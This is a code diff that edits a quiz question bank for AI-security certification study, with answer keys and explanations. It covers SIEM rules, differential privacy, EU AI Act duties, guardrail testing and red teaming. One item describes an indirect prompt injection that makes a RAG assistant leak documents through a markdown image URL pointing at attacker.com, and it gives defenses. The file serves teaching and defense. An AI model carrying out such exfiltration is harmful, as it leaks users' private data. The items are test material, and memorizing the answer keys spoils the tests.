@@ -1221,8 +1221,9 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     options: [
       'Sigma rules automatically update when new threats emerge',
       'Sigma rules include built-in remediation workflows',
-      'Sigma rules are written in a vendor-agnostic format that can be translated to any SIEM platform',
-      'Sigma rules run faster than native SIEM rules'],
+      'A vendor-agnostic format translatable to any SIEM platform',
+      'Sigma rules run faster than native SIEM rules'
+    ],
     correct: 2,
     explanation: 'Sigma is a generic, vendor-neutral signature format for SIEM detections. A single Sigma rule can be translated to KQL (Sentinel), SPL (Splunk), or YARA-L (Chronicle), enabling a single rule library for multiple platforms.',
   },
@@ -3635,10 +3636,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI', 'CAISP', 'AWS-AIF-C01'],
     question: 'Differential privacy (DP) in ML training provides what guarantee?',
     options: [
-      'No individual\'s training data can be identified by inspecting model weights',
+      'No individual\'s training data can be identified from the model weights',
       'All training data is encrypted before being used for model training',
-      'The model\'s output distribution changes by at most a small epsilon factor whether or not any single individual\'s data is included',
-      'The model forgets all training data after a specified retention period'],
+      'Output changes by at most epsilon whether or not any individual is included',
+      'The model forgets all training data after a specified retention period'
+    ],
     correct: 2,
     explanation: 'Differential privacy guarantees that the probability of any output changes by at most e^ε whether or not any single person\'s record is in the training set. DP-SGD clips gradients and adds calibrated Gaussian noise during training. Small ε = stronger privacy but worse accuracy.',
   },
@@ -3698,9 +3700,10 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     options: [
       'Explainability is only required for open-source models',
       'Explainability reduces the model\'s computational cost',
-      'Explainability always improves model accuracy',
-      'Individuals have the right to understand why automated systems made decisions affecting them'],
-    correct: 3,
+      'Individuals have a right to understand automated decisions about them',
+      'Explainability always improves overall model accuracy'
+    ],
+    correct: 2,
     explanation: 'GDPR Article 22 grants individuals the right not to be subject to solely automated decisions with significant effects, and the right to an explanation. Similar requirements exist in the EU AI Act, US FCRA (credit), and ECOA (lending). Black-box models in these contexts create legal exposure.',
   },
 {
@@ -3942,8 +3945,9 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     options: [
       'The license terms governing commercial use of a dataset',
       'The geographic region where training data is physically stored',
-      'The documented history of data — its origin, custody chain, transformations, and how it was used in models',
-      'The encryption standard applied to training data at rest'],
+      'The documented origin, custody chain, and transformations of data',
+      'The encryption standard applied to training data at rest'
+    ],
     correct: 2,
     explanation: 'Data provenance tracks where data came from, who collected it, how it was transformed, and which models were trained on it. This is essential for: reproducing results, debugging model failures, GDPR compliance (data subject rights), and detecting supply chain contamination in training data.',
   },
@@ -4154,9 +4158,10 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     question: 'The EU AI Act requires high-risk AI systems to include:',
     options: [
       'Real-time API access for regulators to query the model',
-      'Open-source release of model weights',
-      'Mandatory annual retraining on new data',
-      'Technical documentation, logging, human oversight, and conformity assessment before deployment'],
+      'Open-source release of the trained model weights',
+      'Mandatory annual retraining on newly collected data',
+      'Technical documentation, logging, oversight, and conformity assessment'
+    ],
     correct: 3,
     explanation: 'The EU AI Act mandates that high-risk AI systems (employment, credit, education, law enforcement, etc.) include: technical documentation, automatic logging, information for users, human oversight measures, and accuracy/robustness/cybersecurity requirements. They must undergo conformity assessment before market placement.',
   },
@@ -4501,10 +4506,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI', 'GIAC-GASAE', 'SCS-C03'],
     question: 'Guardrail testing should be performed:',
     options: [
-      'Continuously — regression testing after any model, guardrail, or system prompt change, plus periodic red team exercises',
-      'Annually as part of the organization\'s standard security review cycle',
+      'Continuously, with regression tests after any change plus red team exercises',
+      'Annually as part of the standard organizational security review cycle',
       'Once during initial deployment, then only when the model is updated',
-      'Only when a security incident involving the AI system is reported'],
+      'Only when a security incident involving the AI system is reported'
+    ],
     correct: 0,
     explanation: 'Guardrails can be bypassed by new attack techniques or broken by model/prompt updates. Regression testing re-runs known attack prompts after every change. Periodic red team exercises discover new bypass techniques. Guardrail testing is an ongoing operational control, not a one-time activity.',
   },
@@ -17883,10 +17889,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI', 'CAISP', 'CAIS', 'SCS-C03'],
     question: 'EU AI Act Article 73 establishes serious incident reporting obligations. What constitutes a "serious incident" and what is the reporting timeline for providers?',
     options: [
-      'Any AI output that a user considers incorrect or unfair — report within 30 days',
-      'An incident resulting in death, serious harm to health or property, serious breach of fundamental rights, or serious disruption of critical infrastructure',
-      'Any AI system outage or degraded performance — report within 90 days',
-      'Security breaches affecting AI training data — report within 72 hours per GDPR Article 33'],
+      'Any AI output a user considers incorrect or unfair, reported within 30 days',
+      'Death, serious harm to health or property, or breach of fundamental rights',
+      'Any AI system outage or degraded performance, reported within 90 days',
+      'Security breaches affecting AI training data, reported within 72 hours'
+    ],
     correct: 1,
     explanation: 'EU AI Act Article 73: applies to high-risk AI systems (Annex III). Serious incident = malfunction or misuse leading to death, serious injury, significant property damage, fundamental rights infringement, or critical services disruption. Timeline: immediate (without undue delay) for death/serious harm; 15 working days for other serious incidents; 10 working days for fundamental rights infringements.',
   },
@@ -18974,10 +18981,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['CAIS', 'SecAI', 'CAISP'],
     question: 'Constitutional AI (CAI, Anthropic 2022) aligns LLMs through a self-critique loop instead of human labelers for harmful content. What security property does this alignment approach improve over RLHF alone?',
     options: [
-      'Constitutional AI produces models that are completely immune to jailbreaks',
-      'CAI prevents adversarial inputs by training the model to detect injection patterns in its input',
-      'CAI uses a written "constitution" (a set of principles) to guide automated critique-and-revision of model outputs, reducing reliance on human judgment for edge cases',
-      'CAI trains the model to always refuse requests it cannot verify as legitimate'],
+      'Constitutional AI produces models completely immune to jailbreaks',
+      'CAI trains the model to detect injection patterns in its input',
+      'CAI uses a written constitution to guide automated critique and revision',
+      'CAI trains the model to refuse requests it cannot verify as legitimate'
+    ],
     correct: 2,
     explanation: 'Constitutional AI (Bai et al., 2022): (1) CAI critique loop: model generates response, then critiques it against each constitutional principle, revises, repeats; (2) AI feedback instead of human labels for harmful content: uses the model to generate preference labels for RL, reducing the "RLHF human labeler bottleneck" on edge-case safety; (3) Transparency: the constitution is explicit and auditable — you can read exactly what principles guided alignment, unlike black-box RLHF reward models. Security implication: CAI-aligned models tend to be more consistent on gray-area cases but are not immune to adversarial prompting — the constitution is a training-time artifact, not a runtime filter.',
   },
@@ -21804,10 +21812,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     question: 'What distinguishes a foundation model from a traditional task-specific ML model?',
     options: [
       'Foundation models require less compute to train than traditional ML models',
-      'Foundation models use rule-based systems while traditional ML models use statistical learning',
-      'Foundation models are only used for image generation; traditional models cover all other tasks',
-      'Foundation models are large-scale models pre-trained on broad data using self-supervised learning, adaptable to many downstream tasks via prompting or fine-tuning'],
-    correct: 3,
+      'Foundation models use rule-based systems while traditional ML is statistical',
+      'Pre-trained on broad data with self-supervision and adaptable to many tasks',
+      'Foundation models are only used for image generation, unlike other models'
+    ],
+    correct: 2,
     explanation: 'Foundation models (Stanford HAI, 2021): pre-trained at scale using self-supervised learning on massive datasets. Emergent capabilities allow adaptation to many tasks via prompting or fine-tuning. Risks: capabilities are emergent and not fully understood; fine-tuned versions may exhibit unexpected behaviors; single training run impacts millions of downstream applications. AWS-AIF-C01 Domain 2.',
   },
   {
@@ -22357,10 +22366,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI'],
     question: 'A DevSecOps team is integrating an open-source Hugging Face model into a production ML pipeline. Which control is MOST important to verify before deployment?',
     options: [
-      'Confirm the model was uploaded by a verified Hugging Face organization account',
-      'Verify the model file hash against the published checksum and review the model card for training data provenance, known limitations, and bias disclosures',
-      'Check that the model weights file size is less than 10GB to prevent resource exhaustion',
-      'Confirm the model repository has at least 1,000 GitHub stars to indicate community trust'],
+      'Confirm the model was uploaded by a verified Hugging Face organization',
+      'Verify the file hash against the published checksum and review the model card',
+      'Check that the model weights file is under 10GB to avoid resource exhaustion',
+      'Confirm the repository has at least 1,000 stars to indicate community trust'
+    ],
     correct: 1,
     explanation: 'Hash verification ensures model weight integrity (preventing substitution attacks) while model card review provides provenance, bias, and limitation disclosures required for risk assessment. Community stars (A) are social proof, not security evidence; file size (C) is a resource planning concern; verified organization status (D) reduces but doesn\'t eliminate risk — compromised accounts can still serve poisoned models. This maps to OWASP LLM05 (Supply Chain) and SecAI+ Domain 4.',
   },
@@ -22911,10 +22921,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['GIAC-GOAA', 'CAIS', 'CAISP', 'SecAI'],
     question: 'When red teaming a production LLM deployment, which phase MUST precede all others to ensure the red team\'s findings are actionable for the blue team?',
     options: [
-      'Interviewing the development team to understand the RLHF training dataset composition',
-      'Threat modeling the system: documenting the AI deployment\'s purpose, trust boundaries, tool permissions, data access, and security-relevant behavior expectations',
-      'Automated fuzzing with Garak or PyRIT to generate a large volume of test cases before scoping',
-      'Establishing a jailbreak success rate baseline on a reference model of the same family'],
+      'Interviewing the development team about the RLHF training data composition',
+      'Threat modeling the deployment: trust boundaries, tool permissions, data access',
+      'Automated fuzzing with Garak or PyRIT to generate test cases before scoping',
+      'Establishing a jailbreak success rate baseline on a reference model'
+    ],
     correct: 1,
     explanation: 'Threat modeling must precede execution because red team findings are only meaningful relative to the system\'s intended security posture. Without understanding what the AI system is supposed to do (purpose), what it has access to (tools, data), who the threat actors are, and what constitutes a security failure for this specific deployment, the red team has no basis for prioritizing findings by risk. A jailbreak might be critical (customer support bot leaking PII) or acceptable (creative writing assistant producing off-topic content). Automated fuzzing (A) before scoping generates noise — many findings will be irrelevant to the actual threat model. Training data composition (C) is valuable but secondary. Baseline testing (D) is useful for comparison but requires the threat model to interpret.',
   },
@@ -24513,10 +24524,11 @@ export const QUIZ_QUESTIONS: QuizQuestion[] = [
     certTags: ['SecAI', 'GIAC-GOAA'],
     question: 'An attacker uses an indirect prompt injection in a document processed by a RAG-enabled AI assistant to cause the assistant to encode and exfiltrate sensitive retrieved documents via rendered markdown image URLs (e.g., ![x](https://attacker.com/log?data=BASE64_ENCODED_DATA)). What control specifically prevents this exfiltration channel?',
     options: [
-      'Increasing the LLM\'s content safety filter threshold for the document processing use case',
-      'Requiring multi-factor authentication before the AI assistant can access the knowledge base',
-      'Encrypting all documents in the RAG knowledge base',
-      'Strict Content Security Policy preventing requests to non-allowlisted domains, plus Markdown sanitization that strips untrusted URL schemes before rendering'],
+      'Increasing the content safety filter threshold for document processing',
+      'Requiring multi-factor authentication before knowledge base access',
+      'Encrypting all documents held in the RAG knowledge base at rest',
+      'A strict Content Security Policy plus Markdown URL sanitization'
+    ],
     correct: 3,
     explanation: 'The markdown image exfiltration technique (reported against Claude, ChatGPT, and others) exploits the rendering environment: if the AI response is rendered as markdown, image tags with attacker-controlled URLs trigger HTTP requests carrying encoded data in URL parameters. Mitigations: (1) CSP img-src directive allowing only trusted domains; (2) Markdown sanitization — strip or rewrite image src URLs before rendering; (3) Proxy image requests through a server-side image proxy; (4) Output filtering for URL patterns in responses. This is a defense-in-depth problem requiring both LLM-level and rendering-layer controls. Source: SecAI+ advanced attack techniques.',
   },
